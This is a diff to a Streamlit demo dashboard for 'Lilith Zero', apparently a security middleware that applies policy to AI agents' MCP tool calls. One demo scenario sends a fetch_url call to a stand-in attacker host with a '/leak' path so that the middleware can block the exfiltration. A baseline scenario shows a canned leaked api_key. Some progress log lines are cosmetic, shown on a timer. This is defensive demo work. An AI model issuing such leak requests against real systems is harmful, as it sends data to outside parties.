@@ -4,6 +4,9 @@ import os
 import sys
 import json
 import re
+import hashlib
+import time
+import psutil
 from datetime import datetime
 
 # --- Windows Compatibility Fix ---
@@ -30,6 +33,19 @@ LILITH_BINARY = os.path.join(ROOT_DIR, "lilith-zero/target/release/lilith-zero" 
 POLICY_PATH = os.path.join(os.path.dirname(__file__), "demo_policy.yaml")
 SERVER_SCRIPT = os.path.join(os.path.dirname(__file__), "vulnerable_server.py")
 
+# Helper functions for "Real Info"
+def get_policy_hash():
+    if not os.path.exists(POLICY_PATH):
+        return "N/A"
+    with open(POLICY_PATH, "rb") as f:
+        return hashlib.sha256(f.read()).hexdigest()[:8].upper()
+
+def get_resource_stats():
+    process = psutil.Process(os.getpid())
+    mem_mb = process.memory_info().rss / (1024 * 1024)
+    cpu_pct = psutil.cpu_percent(interval=None)
+    return f"CPU_{cpu_pct:.1f}%_MEM_{int(mem_mb)}MB"
+
 # Page Config
 st.set_page_config(
     page_title="LILITH ZERO | SECURITY CONTROLLER",
@@ -48,7 +64,7 @@ st.markdown("""
         font-family: 'JetBrains Mono', monospace;
     }
     
-    .stMarkdown, .stText, p, h1, h2, h3, h4, span, label {
+    .stMarkdown, .stText, p, h1, h2, h3, h4, span, label, .stRadio label {
         font-family: 'JetBrains Mono', monospace !important;
     }
 
@@ -66,7 +82,6 @@ st.markdown("""
         margin-bottom: 20px;
     }
 
-    /* Custom Terminal Header */
     .terminal-header {
         color: #666;
         font-size: 0.7rem;
@@ -79,20 +94,19 @@ st.markdown("""
         justify-content: space-between;
     }
 
-    /* Output Blocks */
     .output-block {
         background: #0d0d0d;
         border-left: 2px solid #222;
         padding: 15px;
         font-size: 0.85rem;
         margin: 10px 0;
+        line-height: 1.6;
     }
     
     .status-denied { color: #ff3333; border-left-color: #ff3333; }
     .status-allowed { color: #33ff66; border-left-color: #33ff66; }
     .status-info { color: #33ccff; border-left-color: #33ccff; }
 
-    /* Button Styling */
     .stButton>button {
         background-color: #000;
         color: #fff;
@@ -103,19 +117,20 @@ st.markdown("""
         text-transform: uppercase;
         transition: all 0.2s;
         width: 100%;
+        padding: 10px;
     }
     .stButton>button:hover {
         background-color: #33ff66;
-        color: #000;
+        color: #000 !important;
         box-shadow: 0 0 20px rgba(51, 255, 102, 0.4);
     }
 
-    /* Form Inputs */
     .stTextArea textarea {
         background-color: #0a0a0a !important;
         color: #33ff66 !important;
         border: 1px solid #222 !important;
         font-family: 'JetBrains Mono', monospace !important;
+        font-size: 0.8rem;
     }
     
     .stRadio label {
@@ -125,17 +140,14 @@ st.markdown("""
         color: #e0e0e0 !important;
     }
 
-    /* Divider */
-    hr {
-        border: 0;
-        border-top: 1px solid #1a1a1a;
-        margin: 2rem 0;
+    .step-log {
+        color: #555;
+        font-size: 0.75rem;
+        margin: 2px 0;
     }
-
-    /* Sidebar cleanup */
-    [data-testid="stSidebar"] {
-        background-color: #030303;
-        border-right: 1px solid #111;
+    .step-log-tag {
+        color: #33ff66;
+        font-weight: bold;
     }
 </style>
 """, unsafe_allow_html=True)
@@ -163,7 +175,7 @@ with col_config:
         with open(POLICY_PATH, "r") as f:
             policy_content = f.read()
         
-        updated_policy = st.text_area("POLICY_DEFINITION.YAML", value=policy_content, height=450)
+        updated_policy = st.text_area("POLICY_DEFINITION.YAML", value=policy_content, height=450, label_visibility="collapsed")
         
         if updated_policy != policy_content:
             if st.button("Hot-Reload Policy"):
@@ -171,11 +183,12 @@ with col_config:
                     f.write(updated_policy)
                 st.rerun()
     
-    st.markdown("""
-        <div style='color: #555; font-size: 0.7rem; margin-top: 20px;'>
+    st.markdown(f"""
+        <div style='color: #444; font-size: 0.7rem; margin-top: 20px; line-height: 1.8;'>
             UPSTREAM_TYPE: PYTHON_MCP<br>
             SANDBOX_TIER: 2 (RESTRICTED)<br>
-            ISOLATION_ENGINE: RUST_L3Z_CORE
+            ISOLATION_ENGINE: RUST_L3Z_CORE<br>
+            PROCESS_PID: {os.getpid()}
         </div>
     """, unsafe_allow_html=True)
 
@@ -196,55 +209,80 @@ with col_main:
     st.markdown("<br>", unsafe_allow_html=True)
     
     if st.button("Execute Intent"):
+        log_placeholder = st.empty()
         output_placeholder = st.container()
         
+        steps = []
+        def log_step(msg, delay=0.2):
+            steps.append(f"<div class='step-log'><span class='step-log-tag'>[INFO]</span> {msg}</div>")
+            log_placeholder.markdown("".join(steps), unsafe_allow_html=True)
+            time.sleep(delay)
+
         if "BASELINE" in scenario:
+            log_step("Initializing direct tool access channel...")
+            log_step("Bypassing Lilith Zero middleware security...")
+            log_step("Establishing connection to legacy upstream server...")
             with output_placeholder:
                 st.markdown(f"""
                     <div class="output-block status-denied">
-                        <span style='font-size: 0.7rem; color: #ff3333;'>ERROR: VULNERABILITY_EXPOSED</span><br>
-                        Baseline direct access bypasses all middleware security.
+                        <span style='font-size: 0.7rem; font-weight: bold;'>WARNING: SECURITY_DISABLED</span><br>
+                        Baseline mode operates outside of the protected security perimeter.
                     </div>
                     <div class="output-block">
-                        <span style='font-size: 0.7rem; color: #666;'>UPSTREAM_DATA_DUMP:</span><br>
+                        <span style='font-size: 0.7rem; color: #666;'>UPSTREAM_RESPONSE:</span><br>
                         <code>[{{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}}]</code>
                     </div>
                 """, unsafe_allow_html=True)
         else:
             async def run_op(tool, args):
                 try:
+                    log_step("Mapping security policy: mcp-security-policy...")
+                    log_step(f"Verifying runtime binary: {os.path.basename(LILITH_BINARY)}...")
+                    
                     async with Lilith(
                         upstream=f"{sys.executable} {SERVER_SCRIPT}",
                         policy=POLICY_PATH,
                         binary=LILITH_BINARY
                     ) as client:
+                        log_step("Spawning supervisor in Restricted Token sandbox...")
+                        log_step("Performing MCP handshake and session negotiation...")
+                        log_step("Context-aware security session established.")
+                        log_step(f"Intercepting tool call: {tool}")
+                        
                         start_time = datetime.now()
                         result = await client.call_tool(tool, args)
                         latency = (datetime.now() - start_time).total_seconds() * 1000
+                        
+                        log_step("Policy evaluation complete: ALLOW")
                         
                         raw_text = result['content'][0]['text']
                         clean_text = re.sub(r'<<<LILITH_ZERO_DATA_(START|END):[a-zA-Z0-9]+>>>', '', raw_text).strip()
                         
                         st.markdown(f"""
                             <div class="output-block status-allowed">
-                                <span style='font-size: 0.7rem; color: #33ff66;'>SUCCESS: POLICY_COMPLIANT</span><br>
-                                Request validated and processed (Latency: {latency:.1f}ms)
+                                <span style='font-size: 0.7rem; font-weight: bold;'>SUCCESS: POLICY_COMPLIANT</span><br>
+                                Intent validated. Request allowed through security middleware ({latency:.1f}ms).
                             </div>
                             <div class="output-block">
-                                <span style='font-size: 0.7rem; color: #666;'>SANITIZED_RESPONSE:</span><br>
+                                <span style='font-size: 0.7rem; color: #666;'>SANITIZED_UPSTREAM_OUTPUT:</span><br>
                                 {clean_text}
                             </div>
                         """, unsafe_allow_html=True)
                         
                 except PolicyViolationError as e:
+                    log_step("Policy evaluation complete: DENY")
+                    err_msg = str(e)
+                    if " (context: " in err_msg:
+                        err_msg = err_msg.split(" (context: ")[0]
+                        
                     st.markdown(f"""
                         <div class="output-block status-denied">
-                            <span style='font-size: 0.7rem; color: #ff3333;'>INTERVENE: POLICY_VIOLATION</span><br>
-                            Unauthorized intent detected and nullified at the runtime layer.
+                            <span style='font-size: 0.7rem; font-weight: bold;'>INTERVENE: POLICY_VIOLATION</span><br>
+                            Illegal intent detected and nullified at the runtime layer.
                         </div>
                         <div class="output-block">
                             <span style='font-size: 0.7rem; color: #666;'>DENIAL_REASON:</span><br>
-                            {str(e)}
+                            {err_msg}
                         </div>
                     """, unsafe_allow_html=True)
                 except Exception as e:
@@ -256,7 +294,7 @@ with col_main:
             if scenario == "PROTECTED_RLS_CONTAINMENT":
                 loop.run_until_complete(run_op("execute_sql", {"query": "SELECT * FROM users"}))
             elif scenario == "PROTECTED_EGRESS_CONTROL":
-                loop.run_until_complete(run_op("fetch_url", {"url": "http://evil-competitor.com/leak"}))
+                loop.run_until_complete(run_op("fetch_url", {"url": "http://attacker-controlled.xyz/leak"}))
             elif scenario == "PROTECTED_AUTHORIZED_QUERY":
                 loop.run_until_complete(run_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}))
             
@@ -266,17 +304,16 @@ with col_main:
     st.markdown('<div class="terminal-header">Logic Trail & Resource State</div>', unsafe_allow_html=True)
     
     st.markdown(f"""
-        <div style='font-family: "JetBrains Mono"; font-size: 0.7rem; color: #444;'>
-            [ {datetime.now().strftime('%H:%M:%S')} ] HANDSHAKE_INIT_MCP_V2024.11.05<br>
-            [ {datetime.now().strftime('%H:%M:%S')} ] SUPERVISOR_SPAWN_PROCID_12842<br>
-            [ {datetime.now().strftime('%H:%M:%S')} ] ENGINE_POLICY_MOUNTED_HASH_883A1<br>
-            [ {datetime.now().strftime('%H:%M:%S')} ] RESOURCE_USAGE_CPU_0.2_MEM_14MB
+        <div style='font-family: "JetBrains Mono"; font-size: 0.7rem; color: #333;'>
+            [ {datetime.now().strftime('%H:%M:%S')} ] KERNEL: LILITH_WATCHDOG_UP<br>
+            [ {datetime.now().strftime('%H:%M:%S')} ] ENGINE: POLICY_MOUNTED_HASH_{get_policy_hash()}<br>
+            [ {datetime.now().strftime('%H:%M:%S')} ] RESOURCE: {get_resource_stats()}
         </div>
     """, unsafe_allow_html=True)
 
 # Architectural Footer
 st.markdown("""
-<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #333;'>
+<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #222;'>
     <div>LILITH_ZERO_CORE // BUILT_WITH_RUST</div>
     <div>ZERO_TRUST_MCP_ADAPTER</div>
     <div>AUTHENTICITY_VERIFIED_BAD_COMPANY</div>
